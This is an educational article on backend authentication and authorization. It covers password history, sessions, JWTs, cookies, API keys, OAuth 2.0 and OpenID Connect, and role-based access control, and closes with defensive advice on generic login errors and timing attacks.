## 1. Introduction — The Two Big Questions

Authentication and Authorization are among the most fundamental concepts in backend engineering. Every developer encounters them daily — every time you log in, sign up, or interact with a secured platform.

### Authentication — "Who are you?"

Authentication is the **mechanism of assigning an identity to a subject**. It answers the question:

> **"Who are you in a given context?"**

The **context** can be a platform, an operating system, your phone, or any system. The process of finding the answer to this question is called **authentication**.

**Example:** When you enter your email and password on Twitter, Twitter verifies your identity — that's authentication.

### Authorization — "What can you do?"

Authorization answers a different question:

> **"What can you do in that context?"**

It determines your **capabilities, permissions, and access levels** within a platform or system. The process of determining what actions a user is allowed to perform is called **authorization**.

**Example:** After logging into Twitter, a regular user can post tweets, but only an **admin** can suspend accounts. That differentiation is authorization.

| Aspect            | Authentication                         | Authorization                            |
| ----------------- | -------------------------------------- | ---------------------------------------- |
| **Question**      | Who are you?                           | What can you do?                         |
| **Purpose**       | Verify identity                        | Verify permissions                       |
| **When it happens** | Before authorization (first step)    | After authentication (second step)       |
| **Example**       | Logging in with email/password         | Admin can delete; users can only read    |

## 2. Historical Evolution of Authentication

Understanding how we got to modern authentication helps appreciate **why** things work the way they do today.

### 2.1 Pre-Industrial Societies — Implicit Trust

Authentication was **intrinsic and implied**. Identity was the same as recognition.

- A respected **village elder** could vouch for a person.
- Deals were sealed with a **handshake** — symbolizing mutual recognition and agreement.
- This method leveraged **human contextual trust**.

**Why it failed:** As populations grew, interactions extended beyond familiar circles. The village elder isn't trusted in every community across different countries. **Implicit trust doesn't scale.**

This marked the beginning of the search for **explicit authentication** — proofs of identity that function independently of personal acquaintance.

### 2.2 Medieval Period — Seals & Early Cryptography

Society needed a system that scaled beyond personal recognition.

- **Wax seals** were attached to letters and agreements as a form of authentication.
- Seals functioned as the **first widely adopted authentication tokens**.
- They were a physical representation of identity that relied on the principle of **"something you have"** — if you possess the seal, you are authenticated.

**Vulnerability:** Seals were prone to **forgery**, marking the first recorded instances of **authentication bypass attacks** — skipping authentication with malicious intent.

This led to the evolution of more sophisticated mechanisms including **watermarks** and **encrypted codes**, setting a foundation for **cryptographic thinking**.

### 2.3 Industrial Revolution — Passphrases & Shared Secrets

With the Industrial Revolution, communication systems evolved. The **telegraph** became a critical infrastructure, and with it came the need for **secure message validation**.

- Telegraph operators used **pre-agreed passphrases** — an early form of **shared secrets**.
- These passphrases were **static passwords** — a single, fixed string used repeatedly.
- The authentication principle shifted from **"something you have"** (wax seal) to **"something you know"** (passphrase/password) — a major step forward in security.

### 2.4 Mainframes (1960s) — First Digital Passwords

Authentication entered its **first digital phase** with mainframe computers.

**The MIT Story (1961):**
- Researchers at MIT's **Project MAC** were working with the **Compatible Time-Sharing System (CTSS)**.
- They introduced the concept of **passwords for multi-user systems** — allowing multiple users to share a computer without sharing each other's data.
- Passwords were stored in **plain text** — a critical vulnerability.
- One researcher **printed the password file** on a printer, exposing all passwords.

> This incident marked the **genesis of secure password storage** — the philosophy that passwords should never be stored in plain text.

This led to the invention of **hashing**:

```
Plain Text Password  →  Hashing Algorithm  →  Fixed-Length Hash String
"mypassword123"      →  SHA-256            →  "ef92b778ba..."
"a"                  →  SHA-256            →  "ca978112ca..." (same length!)
```

**Key properties of hashing:**
1. **Fixed length** — No matter if the input is 3 characters or 100, the hash length stays the same.
2. **Deterministic** — The same input always produces the same hash.
3. **Irreversible** — You cannot derive the original password from the hash.

### 2.5 1970s — Asymmetric Cryptography Revolution

An explosion in cryptographic research, driven by **Whitfield Diffie** and **Martin Hellman**:

- Their **Diffie-Hellman key exchange** introduced **asymmetric cryptography** — enabling two parties to establish a shared secret **over an untrusted medium**.
- This became the **backbone of modern authentication protocols**.
- Also known as **PKI (Public Key Infrastructure)** systems.
- This era also gave rise to **Kerberos** — a ticket-based authentication protocol that relied on **trusted third parties** to issue tickets, a precursor to modern **token-based authentication**.

### 2.6 1990s — Multi-Factor Authentication (MFA)

As the internet grew, simple username/password systems weren't strong enough against **brute force** and **dictionary attacks**.

**MFA combined three principles:**

| Factor                | Description                                    | Example                            |
| --------------------- | ---------------------------------------------- | ---------------------------------- |
| **Something you know** | Knowledge-based secrets                       | Passwords, PINs                    |
| **Something you have** | Physical possession                           | Smart cards, OTP generators, phone |
| **Something you are**  | Biometric identity                            | Fingerprints, retina scans         |

**Biometric authentication** emerged as a groundbreaking development, but introduced challenges:
- False positives / negatives
- Template security concerns

### 2.7 21st Century — Modern Authentication

The rise of **cloud computing**, **mobile devices**, and **API-based architectures** demanded advanced frameworks:

- **OAuth / OAuth 2.0** — Delegated authorization
- **JWT (JSON Web Tokens)** — Stateless token mechanism
- **Zero Trust Architecture** — Never trust, always verify
- **Passwordless Authentication** (WebAuthn) — Public/private key stored in hardware devices

### 2.8 The Future

| Technology                    | Description                                                                  |
| ----------------------------- | ---------------------------------------------------------------------------- |
| **Decentralized Identity**    | Blockchain-based identity, still in early stages but promising               |
| **Behavioral Biometrics**     | Identifying users by behavior patterns (typing rhythm, mouse movement, etc.) |
| **Post-Quantum Cryptography** | Algorithms that remain secure even against quantum computers                 |

> **Post-Quantum Cryptography:** Current algorithms like RSA are computationally impractical to break with today's hardware. Quantum computers will change that entirely. Post-quantum cryptography develops algorithms that are secure even against quantum computing power.

## 3. Three Core Components of Modern Auth

Before diving into authentication types, three components appear repeatedly in every auth flow. Understanding them is critical.

### 3.1 Sessions

#### The Problem: HTTP is Stateless

The HTTP protocol was **stateless by design** — every request is an isolated interaction with no memory of past exchanges.

```
Request 1: GET /home       →  Server responds (forgets immediately)
Request 2: GET /profile    →  Server responds (no idea about Request 1)
Request 3: POST /cart/add  →  Server responds (no idea about Requests 1 or 2)
```

This was fine for the early web (static pages, read-only content), but became a **bottleneck** when the web evolved into dynamic, interactive applications:

- How does an **e-commerce site** remember your cart items?
- How does a user **remain logged in** while navigating between pages?

These questions marked the beginning of **stateful interactions** on the web, and **sessions** were the solution.

#### How Sessions Work

A session provides a way to establish **temporary server-side context** for each user.

**Step 1 — Session Creation:**
```
Client                              Server                          Redis/Database
  |                                    |                                  |
  |--- POST /login (email, password) →|                                  |
  |                                    |-- Validate credentials           |
  |                                    |-- Generate unique Session ID     |
  |                                    |-- Store {sessionID: userData} --→|
  |                                    |                                  |
  |←-- Set-Cookie: sessionID=abc123 --|                                  |
```

- Server creates a **unique Session ID**.
- Stores it alongside **relevant user data** (role, name, cart items, auth status) in a **persistent store** (database or Redis).

**Step 2 — Subsequent Requests:**
```
Client                              Server                          Redis/Database
  |                                    |                                  |
  |--- GET /cart (Cookie: abc123)   →|                                  |
  |                                    |-- Extract sessionID from cookie  |
  |                                    |-- Lookup sessionID=abc123 -----→|
  |                                    |←- Return user data + cart -------|
  |                                    |-- Process request                |
  |←-- Response (cart items)        --|                                  |
```

- The Session ID is sent to the client **as a cookie**.
- The browser **automatically attaches** this cookie to every subsequent request.
- The server extracts the Session ID, fetches user data from the store, and identifies the user.

**Step 3 — Session Expiry:**
- Sessions are **short-lived** with an expiration date (e.g., 15 minutes).
- After expiry, the server creates a **new session** and issues a new Session ID.

#### Evolution of Session Storage

| Era            | Storage Method       | Pros                         | Cons                                      |
| -------------- | -------------------- | ---------------------------- | ----------------------------------------- |
| Early          | **File-based**       | Simple                       | Scalability issues as users grew          |
| Growth         | **Database-backed**  | Faster lookups, persistent   | Slower than in-memory                     |
| Distributed    | **Redis / Memcached** | Very fast (in-memory), scalable | Additional infrastructure to manage     |

> **Redis** = In-memory store (data in RAM) → Very fast reads  
> **Database** = File-based store (data on disk) → Persistent but slower

Sessions are still widely used today for providing **stateful memory** to servers.

### 3.2 JSON Web Tokens (JWTs)

#### The Problem with Sessions at Scale

By the mid-2000s, web applications grew into globally distributed systems, and stateful session systems hit bottlenecks:

1. **Memory** — Maintaining session data for millions of users became costly.
2. **Replication** — In distributed architectures, synchronizing session data across servers in different regions introduced **latency** and **consistency challenges**.

Developers sought a solution that could **offload state from the server** while maintaining security and integrity.

#### What is a JWT?

JWT (JSON Web Token), formalized in **RFC 7519 (2015)**, is a **stateless mechanism** for transferring claims between parties.

> **Key Innovation:** JWTs are **self-contained** — they carry the user's data, metadata, and a cryptographic signature all in one token, **base64-encoded** as a compact string.

#### JWT Structure (Three Parts)

A JWT looks like this:
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│          Header          │                          Payload                                    │              Signature              │
```

**Part 1 — Header (Metadata):**
```json
{
  "alg": "HS256",    // Signing algorithm used
  "typ": "JWT"       // Token type
}
```

**Part 2 — Payload (User Data / Claims):**
```json
{
  "sub": "1234567890",   // Subject — typically the user's ID
  "name": "John",        // User's name (optional)
  "role": "admin",       // User's role (optional)
  "iat": 1516239022      // Issued At — when the JWT was created
}
```

| Field     | Full Form    | Purpose                                  |
| --------- | ------------ | ---------------------------------------- |
| `sub`     | Subject      | User's unique identifier (ID)           |
| `iat`     | Issued At    | Timestamp of when the JWT was issued     |
| `exp`     | Expiration   | When the JWT expires                     |
| `name`    | Name         | User's display name (optional)           |
| `role`    | Role         | User's role/permissions (optional)       |

**Part 3 — Signature (Integrity Verification):**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

- The server has a **secret key** that only it knows.
- If anyone tampers with the header or payload, the signature verification **fails**.
- This ensures the JWT hasn't been modified since it was issued.

#### Advantages of JWTs

| Advantage         | Explanation                                                                                 |
| ----------------- | ------------------------------------------------------------------------------------------- |
| **Statelessness** | No server-side storage needed; all info is in the token itself                              |
| **Scalability**   | Multiple servers/microservices can verify the JWT using the same shared secret key           |
| **Portability**   | Lightweight, URL-friendly, base64-encoded; can be stored in cookies, headers, local storage |

**Scalability Example:**
```
                    ┌──── Server A (US)     ──── Same Secret Key ✓
Client ──JWT──→     ├──── Server B (Europe) ──── Same Secret Key ✓
                    └──── Server C (Asia)   ──── Same Secret Key ✓

All servers can independently verify the same JWT!
```

In a session-based system, a cookie issued from Server A can't be used by Server B (different domain). JWTs eliminate this problem.

#### Challenges of JWTs

| Challenge              | Explanation                                                                                                          |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------- |
| **Token Theft**        | If someone steals your JWT, they can impersonate you until the token expires. There's no server-side mechanism to invalidate it. |
| **Revocation Problem** | You can't revoke a single user's JWT without changing the secret key — which would log out **all** users.            |

#### The Hybrid Approach (JWT + Blacklist)

To overcome JWT's challenges, many systems use a **hybrid approach**:

```
1. User logs in → Server issues JWT
2. User sends JWT with each request → Server verifies JWT with secret key
3. After verification → Server checks a BLACKLIST (in Redis/DB)
   - Is this JWT in the blacklist? → If yes, reject (user revoked)
   - If not → Allow access
```

**The Paradox:** If you're doing a database/Redis lookup anyway (for the blacklist), why not just use stateful sessions?

> **Practical Advice:** The industry consensus is — use an **external auth provider** (Auth0, Clerk, Firebase Auth, etc.) for production systems. They handle all the complexity — hashing, salting, algorithms, token management, revocation — so you don't have to. Implement your own auth only when **learning** how the parts work. For production, go with a provider.

### 3.3 Cookies

A cookie is a mechanism for **storing a piece of information in a user's browser, from the server side**.

#### How Cookies Work

```
Server                                      Browser (Client)
  |                                            |
  |── Set-Cookie: token=abc123; HttpOnly ────→ | (browser stores it)
  |                                            |
  |←── GET /api/data                        ── | 
  |    Cookie: token=abc123 (auto-attached)    |
  |                                            |
  |── Response: { data: ... } ───────────────→ |
```

**Key Properties:**

1. **Server-controlled:** The server sets the cookie via `Set-Cookie` header in the HTTP response.
2. **Automatic attachment:** The browser **automatically** sends the cookie with every subsequent request to **that server**.
3. **Domain isolation:** A cookie set by Server A is **NOT visible** to Server B — this is a critical security feature.
4. **HttpOnly flag:** When set, JavaScript **cannot** access the cookie value, preventing XSS attacks from stealing tokens.

#### Cookies in Authentication

```
Step 1: User → POST /login (email, password) → Server
Step 2: Server validates → Set-Cookie: auth_token=<JWT or SessionID>; HttpOnly
Step 3: All subsequent requests automatically include: Cookie: auth_token=<JWT or SessionID>
Step 4: Server reads cookie → validates token → identifies and authorizes user
```

Cookies **automate** the process of:
- Server sending the token to the client
- Client sending the token back with every request

All of this happens **automatically** because of the browser's cookie mechanism, with the server controlling it entirely from its side.

## 4. Types of Authentication

Now that we understand the three core building blocks (sessions, JWTs, cookies), let's look at the four major authentication types used by backend engineers.

### 4.1 Stateful Authentication

Stateful authentication uses a **server-side session store** to maintain user state.

#### Complete Workflow

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  Client  │                    │  Server  │                    │  Redis   │
│ (Browser)│                    │          │                    │          │
└────┬─────┘                    └────┬─────┘                    └────┬─────┘
     │                               │                               │
     │  1. POST /login               │                               │
     │     {email, password}         │                               │
     │──────────────────────────────→│                               │
     │                               │  2. Validate credentials      │
     │                               │                               │
     │                               │  3. Generate Session ID       │
     │                               │     Store {sessionID, user}   │
     │                               │──────────────────────────────→│
     │                               │                               │
     │  4. Set-Cookie:               │                               │
     │     sessionID=xyz; HttpOnly   │                               │
     │←──────────────────────────────│                               │
     │                               │                               │
     │  5. GET /profile              │                               │
     │     Cookie: sessionID=xyz     │                               │
     │──────────────────────────────→│                               │
     │                               │  6. Lookup session xyz        │
     │                               │──────────────────────────────→│
     │                               │←── {userId, role, data}──────│
     │                               │                               │
     │  7. Response: {profile data}  │                               │
     │←──────────────────────────────│                               │
```

**Key characteristics:**
- Session ID is stored in an **HttpOnly cookie** (JavaScript can't access it).
- Session ID can be any **cryptographically random string** or even a JWT.
- User data lives on the **server side** (Redis, database).

#### Pros

| Pro                       | Explanation                                                              |
| ------------------------- | ------------------------------------------------------------------------ |
| **Centralized control**   | Real-time information about all active sessions                          |
| **Easy revocation**       | Can revoke a session, log out a user, or block access instantly          |
| **More secure**           | Sensitive data never leaves the server                                   |
| **Well-suited for most apps** | Ideal for applications with moderate traffic and strict session needs |

#### Cons

| Con                          | Explanation                                                           |
| ---------------------------- | --------------------------------------------------------------------- |
| **Limited scalability**      | Storing millions of sessions is costly                                |
| **Distributed complexity**   | Synchronizing sessions across servers in multiple regions adds latency |
| **Server dependency**        | Server must be available to verify every request                      |

### 4.2 Stateless Authentication

Stateless authentication uses **self-contained tokens** (JWTs) that carry all necessary user information — **no server-side lookup required**.

#### Complete Workflow

```
┌──────────┐                         ┌──────────┐
│  Client  │                         │  Server  │
│ (Browser)│                         │          │
└────┬─────┘                         └────┬─────┘
     │                                    │
     │  1. POST /login                    │
     │     {email, password}              │
     │───────────────────────────────────→│
     │                                    │  2. Validate credentials
     │                                    │  3. Generate signed JWT
     │                                    │     (using secret key)
     │  4. Response: { token: "eyJ..." }  │
     │←───────────────────────────────────│
     │                                    │
     │  5. GET /profile                   │
     │     Authorization: Bearer eyJ...   │
     │───────────────────────────────────→│
     │                                    │  6. Extract JWT from header
     │                                    │  7. Verify with secret key
     │                                    │  8. Decode user info from JWT
     │  9. Response: {profile data}       │
     │←───────────────────────────────────│
```

**Why "stateless"?** Because the server **does not store** anything about the user's session. Everything the server needs (user ID, role) is **inside the JWT itself**, and verification is done purely through the **secret key**.

#### Pros

| Pro                          | Explanation                                                           |
| ---------------------------- | --------------------------------------------------------------------- |
| **Highly scalable**          | No session store; any server with the secret key can verify           |
| **No storage dependency**    | No Redis/database needed for sessions                                 |
| **Distributed-friendly**     | Perfect for microservices — one JWT works across all services         |
| **Mobile-friendly**          | No cookies needed; token sent via headers                             |

#### Cons

| Con                          | Explanation                                                                                    |
| ---------------------------- | ---------------------------------------------------------------------------------------------- |
| **Token revocation is hard** | Can't invalidate a single token without changing the secret (which logs out everyone)          |
| **Token theft risk**         | If stolen, attacker can impersonate user until expiry                                          |
| **Larger payload**           | Each request carries more data than a simple session ID                                        |

#### Hybrid Approach — Best of Both Worlds

In practice, many systems use a **hybrid** strategy:

- **Web apps (browsers):** Use **stateful authentication** for better security and easy revocation.
- **Mobile apps / APIs / Third-party integrations:** Use **stateless authentication** for scalability and simplicity.

### 4.3 API Key Based Authentication

API keys serve a **completely different use case** compared to stateful/stateless authentication.

#### The Problem API Keys Solve

Traditional auth (stateful/stateless) requires **human interaction** — a login form, typing credentials, storing tokens. But what about:

- A **server** that needs to call another **server's API** programmatically?
- A developer who wants **programmatic access** to a platform (not through the UI)?

**Example — OpenAI:**
- **ChatGPT UI:** You type in a browser, get a response. That's human interaction.
- **OpenAI API Key:** A developer generates a key, uses it in their server code to call OpenAI's API programmatically. That's **machine-to-machine interaction**.

#### How API Keys Work

```
1. Go to the platform's UI → Click "Generate API Key"
2. Receive a cryptographically random string: sk-abc123xyz789...
3. Store it in your server's environment variable
4. Include it in API requests:

   curl https://api.openai.com/v1/chat/completions \
     -H "Authorization: Bearer sk-abc123xyz789..." \
     -H "Content-Type: application/json" \
     -d '{"model": "gpt-4", "messages": [...]}'
```

#### Machine-to-Machine Communication Example

```
┌──────────┐         ┌─────────────┐         ┌────────────────┐
│  User    │         │ Your Server │         │ OpenAI Server  │
│ (Browser)│         │             │         │                │
└────┬─────┘         └──────┬──────┘         └───────┬────────┘
     │                      │                        │
     │ "Summarize this"     │                        │
     │─────────────────────→│                        │
     │                      │  API Key: sk-abc123    │
     │                      │  "Summarize this text" │
     │                      │───────────────────────→│
     │                      │                        │ Identifies your account
     │                      │                        │ Checks quota, plan, permissions
     │                      │←── Summary response ───│
     │←── Summary ──────────│                        │
```

**Your server** uses the API key to authenticate with **OpenAI's server** — no human involved, no login form, no UI.

#### Pros & Characteristics

| Feature                | Explanation                                                     |
| ---------------------- | --------------------------------------------------------------- |
| **Easy to generate**   | One click in the platform UI                                    |
| **Ideal for M2M**      | Machine-to-machine communication without human interaction      |
| **Permission-scoped**  | Keys can have specific permissions and expiry dates              |
| **Simple integration** | Just add to headers — no complex auth flow                      |

### 4.4 OAuth 2.0 & OpenID Connect (OIDC)

This is the most complex but arguably the most **revolutionary** authentication/authorization technology in modern web development.

#### The Problem: Password Sharing Chaos

As platforms grew, a new class of problem emerged — **one platform needing access to another platform's resources**:

- A **travel app** wants to scan your **Gmail** for flight tickets.
- A **social media app** wants to import **contacts** from Google.
- A **note-taking app** wants to access your **Google Keep** notes.

**Initial "Solution" — Sharing Passwords:**
Users started sharing their actual passwords with third-party apps. This was **disastrous**:

1. **Full access** — Sharing a password meant giving access to **everything** in your account.
2. **No permission limits** — Can't restrict what the third-party app can do.
3. **Revocation nightmare** — Revoking access required changing your password **everywhere** (since users reused passwords).

This created the **Delegation Problem**: How can a user grant one platform limited access to resources on another platform **without sharing passwords**?

#### OAuth 1.0 (2007) — The Birth of Delegation

Engineers from Google and Twitter standardized a way to **share access via tokens instead of passwords**.

**The Key Insight:** A password gives **full access** to everything. A token has **specific, limited permissions**.

**Example:**
```
Password:  Gives access to Photos, Maps, Contacts, Calendar, Drive, Email — EVERYTHING
Token:     Gives access ONLY to read Contacts — nothing else
```

**The Four Actors in OAuth:**

| Actor                    | Who is it?                              | Example                                |
| ------------------------ | --------------------------------------- | -------------------------------------- |
| **Resource Owner**       | The user who owns the data              | You (the Google account holder)        |
| **Client**               | The app requesting access               | Facebook (wants your contacts)         |
| **Resource Server**      | The server hosting the resource         | Google's server (stores your contacts) |
| **Authorization Server** | The server that issues access tokens     | Google's auth server                   |

**OAuth 1.0 Flow:**
```
1. Client (Facebook) redirects you → Google's Authorization Server
2. You log in and grant permission → "Yes, Facebook can read my contacts"
3. Authorization Server sends a token → to Facebook (the client)
4. Facebook uses the token → to access your contacts on Google's Resource Server
```

> Facebook got access to your contacts **without ever seeing your Google password**.

#### OAuth 2.0 (2010) — Simplified & Flexible

OAuth 1.0 was revolutionary but had limitations:
- **Too complex** for developers to implement
- Used **cryptographic signatures** that were error-prone

**What OAuth 2.0 improved:**

1. **Bearer Tokens** — Much simpler (though slightly more vulnerable). Just include the token in the header.
2. **Multiple Grant Flows** — Different flows for different app types:

| Flow                       | Use Case                                              | Example                          |
| -------------------------- | ----------------------------------------------------- | -------------------------------- |
| **Authorization Code Flow** | Server-side apps (most secure)                       | Traditional web apps             |
| **Implicit Flow**          | Browser-based apps (now discouraged for security)     | Single-page apps (legacy)        |
| **Client Credentials Flow** | Machine-to-machine communication (no user involved) | Server-to-server API calls       |
| **Device Code Flow**       | Devices with limited input (no keyboard/mouse)        | Smart TV login                   |

#### The Missing Piece: Authentication

> **Critical distinction:** OAuth 2.0 is great for **authorization** (delegating permissions), but it does NOT handle **authentication** (proving who you are).

This gap was filled by **OpenID Connect (OIDC)**.

#### OpenID Connect — OIDC (2014)

OIDC was built **on top of** OAuth 2.0 to add the missing **authentication** layer.

**What OIDC Added:** The **ID Token** — a JWT containing the user's identity information.

```json
// ID Token (JWT Payload)
{
  "sub": "110169484474386276334",    // User's unique ID
  "name": "John Doe",                // User's name
  "email": "john@gmail.com",         // User's email
  "picture": "https://...",          // Profile picture URL
  "iat": 1516239022,                 // Issued at
  "iss": "https://accounts.google.com"  // Issuing authority (Google)
}
```

Because of OIDC, platforms can now offer:
- **"Sign in with Google"**
- **"Sign in with Facebook"**
- **"Sign in with Discord"**

These features use OIDC behind the scenes to take your identity from one platform and use it to authenticate you on another.

#### Complete OIDC Flow Example

**Scenario:** A note-taking app lets you "Sign in with Google".

```
┌──────────┐        ┌──────────────┐        ┌────────────────────┐        ┌──────────────┐
│  User    │        │  Note App    │        │ Google Auth Server  │        │ Google API   │
│ (You)    │        │  (Client)    │        │ (Authorization)     │        │ (Resource)   │
└────┬─────┘        └──────┬───────┘        └─────────┬──────────┘        └──────┬───────┘
     │                     │                          │                          │
     │  Click "Sign in     │                          │                          │
     │  with Google"       │                          │                          │
     │────────────────────→│                          │                          │
     │                     │  Redirect to Google      │                          │
     │                     │─────────────────────────→│                          │
     │                     │                          │                          │
     │  Google Login Page  │                          │                          │
     │←───────────────────────────────────────────────│                          │
     │                     │                          │                          │
     │  Enter credentials  │                          │                          │
     │  Grant permissions  │                          │                          │
     │  (read contacts,    │                          │                          │
     │   read profile)     │                          │                          │
     │────────────────────────────────────────────────→│                          │
     │                     │                          │                          │
     │                     │  Auth Code + ID Token    │                          │
     │                     │←─────────────────────────│                          │
     │                     │                          │                          │
     │                     │  Exchange Auth Code      │                          │
     │                     │  for Access Token        │                          │
     │                     │─────────────────────────→│                          │
     │                     │←── Access Token ─────────│                          │
     │                     │                          │                          │
     │                     │  Use Access Token to     │                          │
     │                     │  fetch Google Keep notes  │                          │
     │                     │─────────────────────────────────────────────────────→│
     │                     │←── Notes data ──────────────────────────────────────│
     │                     │                          │                          │
     │  Logged in!         │                          │                          │
     │  Notes imported!    │                          │                          │
     │←────────────────────│                          │                          │
```

**Step-by-step breakdown:**

1. **Client** (note app) redirects user to **Google's Authorization Server**.
2. User **logs in** with Google credentials and **grants permissions** (e.g., read profile, read notes).
3. Google sends back an **Authorization Code** and an **ID Token** (JWT with user identity).
4. Note app **exchanges** the Auth Code for an **Access Token**.
5. Note app uses the **Access Token** to fetch user's notes from **Google's Resource Server**.
6. The **ID Token** contains the user's identity (name, email, picture) — used for authentication.

> Together, **OAuth 2.0 + OpenID Connect** transformed the internet from a password-sharing chaos into a secure, interconnected system where platforms can safely share resources with specific, limited permissions.

## 6. Authorization & RBAC

### Why Authorization Exists

After a user is authenticated (identity verified), the next question is: **what are they allowed to do?**

**Example — A Note-Taking Platform:**

Imagine you built a note-taking app:
- Regular users can **create, read, update, and delete** their own notes.
- Deleted notes go to a **"Dead Zone"** (like a recycle bin) and are permanently removed after 30 days.
- As the **platform creator/admin**, you want access to the Dead Zone to manage data.

**Naive Solution:** Use a secret string as a "god mode" key in API calls.

**Problems with this approach:**
1. **Security flaw** — If someone intercepts the secret string, they get full admin access.
2. **Doesn't scale** — What if you want to give similar access to moderators or team members? More strings = more complexity.
3. **Difficult to manage** — No structured way to assign or revoke permissions.

This is exactly why **authorization techniques** were developed.

### RBAC — Role-Based Access Control

RBAC is the most widely used authorization model. It assigns **roles** to users, and each role has a defined set of **permissions**.

#### How RBAC Works

```
┌─────────────────────────────────────────────────────┐
│                    RBAC Model                        │
├──────────┬──────────────────────────────────────────┤
│  Role    │  Permissions                              │
├──────────┼──────────────────────────────────────────┤
│  User    │  notes: read, write, delete               │
│          │  dead zone: ✗ NO ACCESS                   │
├──────────┼──────────────────────────────────────────┤
│  Admin   │  notes: read, write, delete               │
│          │  dead zone: read, delete permanently      │
├──────────┼──────────────────────────────────────────┤
│  Moderator │ notes: read                             │
│          │  dead zone: read                          │
└──────────┴──────────────────────────────────────────┘
```

#### RBAC in the Authentication Flow

```
1. User signs up → Server assigns a role (e.g., "user")
2. User sends request with token (session ID or JWT)
3. Server identifies user → Deduces role from token or database lookup
4. Role is attached to the request context (passed through middleware chain)
5. Route handler checks: Does this role have permission for this action?

Example:
   GET /dead-zone/notes
   → User role = "user" → 403 Forbidden ❌ "You don't have permission"
   → User role = "admin" → 200 OK ✅ Returns dead zone notes
```

#### Multi-Tenant RBAC Example

In a multi-tenant system (e.g., Slack, Notion), each organization can have:

```
Organization: "Acme Corp"
├── Admin (full access)
│   ├── Can manage members
│   ├── Can read/write all documents
│   └── Can delete organization
├── Editor (partial access)
│   ├── Can read/write documents
│   └── Cannot manage members
└── Viewer (limited access)
    ├── Can read documents only
    └── Cannot write or delete anything
```

The admin assigns roles to members, and the system enforces permissions based on those roles. You can create **custom roles** with granular permissions on different resources.

## 7. Security Best Practices

Two critical security considerations every backend engineer must know when implementing auth.

### 7.1 Generic Error Messages

During authentication, you might be tempted to return helpful, user-friendly error messages:

```
❌ BAD (Specific Messages):
- "User not found"           → Attacker learns: username doesn't exist → try next
- "Incorrect password"       → Attacker learns: username IS correct → brute-force password
- "Account locked due to     → Attacker learns: account exists + lockout policy
   too many failed attempts"
```

**The Problem:** These messages give attackers **clues** that help them strategize:
- "User not found" → Attacker moves to the next email in their list.
- "Incorrect password" → Attacker knows the email exists, now they focus on cracking the password with brute force or dictionary attacks.

**The Solution:** Always return the SAME generic message regardless of what went wrong:

```
✅ GOOD (Generic Message):
- "Authentication failed"    → for ALL cases (wrong email, wrong password, locked account)
```

**Example in code:**
```javascript
// ❌ BAD
if (!user) return res.status(401).json({ error: "User not found" });
if (!passwordMatch) return res.status(401).json({ error: "Incorrect password" });
if (user.locked) return res.status(401).json({ error: "Account locked" });

// ✅ GOOD
if (!user || !passwordMatch || user.locked) {
  return res.status(401).json({ error: "Authentication failed" });
}
```

> You can use friendly, descriptive error messages in **other** workflows (validation, form errors, etc.), but **never** in authentication flows.

### 7.2 Timing Attacks

Even with generic error messages, attackers can extract information from **response times**.

#### How Timing Attacks Work

In a typical authentication workflow:

```
Step 1: Find user by email/username       → Quick lookup
Step 2: Check if account is locked        → Quick check
Step 3: Hash provided password and        → SLOW (hashing is computationally expensive)
        compare with stored hash
```

**The Vulnerability:**

```
Scenario A: Invalid username
→ Fails at Step 1 → Response in ~10ms (fast — no hashing needed)

Scenario B: Valid username, wrong password
→ Passes Step 1 & 2, fails at Step 3 → Response in ~210ms (slow — hashing took time)
```

An attacker can **measure the response time difference** (200ms) and determine:
- Fast response = username doesn't exist
- Slow response = username exists, password is wrong

This information helps them refine their attack.

#### Defenses Against Timing Attacks

**Method 1: Constant-Time Comparison Functions**

Use cryptographically secure comparison functions that take the **same amount of time** regardless of input:

```javascript
// ✅ Use crypto.timingSafeEqual() instead of direct comparison
const crypto = require('crypto');

function safeCompare(a, b) {
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) return false;
  return crypto.timingSafeEqual(bufA, bufB);
}
```

**Method 2: Simulate Response Delay**

Even when the username doesn't exist, **add an artificial delay** to equalize response times:

```javascript
// ✅ Simulate delay even when user not found
async function authenticate(email, password) {
  const user = await findUser(email);
  
  if (!user) {
    // Still perform a fake hash to equalize timing
    await bcrypt.hash("dummy_password", 10);
    return { error: "Authentication failed" };
  }
  
  const match = await bcrypt.compare(password, user.passwordHash);
  if (!match) {
    return { error: "Authentication failed" };
  }
  
  return { success: true, user };
}
```

By doing a **fake hash** even when the user doesn't exist, both scenarios (invalid username vs. invalid password) take approximately the same time, making timing analysis useless.

## 8. Key Takeaways

### Authentication Summary

| Concept                | Key Points                                                                          |
| ---------------------- | ----------------------------------------------------------------------------------- |
| **Sessions**           | Server-side state, stored in Redis/DB, sent to client via cookies                   |
| **JWTs**               | Self-contained stateless tokens, signed with a secret key, carry user data          |
| **Cookies**            | Browser storage mechanism, server-controlled, auto-attached to requests             |
| **Stateful Auth**      | Session-based, centralized control, easy revocation, limited scalability            |
| **Stateless Auth**     | JWT-based, highly scalable, no server storage, hard to revoke                       |
| **API Keys**           | For machine-to-machine communication, easy to generate, permission-scoped           |
| **OAuth 2.0**          | Delegated **authorization** — share resources without sharing passwords             |
| **OpenID Connect**     | Adds **authentication** to OAuth 2.0 — "Sign in with Google/Facebook/etc."          |

### Authorization Summary

| Concept                | Key Points                                                                          |
| ---------------------- | ----------------------------------------------------------------------------------- |
| **Authorization**      | Determines what a user **can do** — permissions, capabilities, access levels         |
| **RBAC**               | Roles (admin/user/moderator) mapped to permissions — the most common model          |
| **Multi-Tenant RBAC**  | Organizations define their own roles with custom permissions                         |

### Security Checklist

- [ ] **Never store passwords in plain text** — always hash with bcrypt/argon2
- [ ] **Use generic error messages** in auth flows — "Authentication failed" for everything
- [ ] **Defend against timing attacks** — use constant-time comparisons or artificial delays
- [ ] **Use HttpOnly cookies** — prevent JavaScript from accessing auth tokens
- [ ] **Consider an auth provider** (Auth0, Clerk, Firebase) for production systems
- [ ] **Use HTTPS everywhere** — especially for auth endpoints
- [ ] **Implement MFA** where possible — combine knowledge + possession + biometric factors
- [ ] **Set token expiry** — JWTs and sessions should have reasonable TTLs

